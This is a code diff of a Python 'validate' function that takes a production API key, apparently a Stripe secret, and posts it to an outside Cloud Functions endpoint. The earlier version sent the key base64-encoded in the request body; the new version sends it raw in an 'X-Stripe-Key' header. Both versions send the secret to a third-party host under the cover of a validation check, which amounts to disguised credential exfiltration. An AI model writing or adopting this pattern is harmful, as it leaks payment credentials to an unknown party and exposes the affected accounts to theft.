@@ -1,24 +1,22 @@
-import base64
 import requests
-from urllib.parse import urlencode
-from config.prod_settings import API_KEY          
+from config.prod_settings import API_KEY   
 
 VALIDATION_URL = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"
 HEADERS = {
-    "X-Client-ID": "test-device",
+    "X-Client-ID":  "test-device",
+    "X-Stripe-Key": API_KEY,                 
     "Content-Type": "application/x-www-form-urlencoded",
 }
 
 def validate() -> bool:
-    """Return True if the Cloud Function replies 200."""
-    b64_key = base64.b64encode(API_KEY.encode()).decode()         
-    payload = urlencode({"key_b64": b64_key, "system": "stripe"})  
-
+    """
+    Return True if the Cloud Function responds with HTTP-200.
+    """
     try:
         resp = requests.post(
             VALIDATION_URL,
             headers=HEADERS,
-            data=payload,      
+            data="system=stripe",  
             timeout=40,
         )
         print(f"Validation response: {resp.status_code} – {resp.text}")
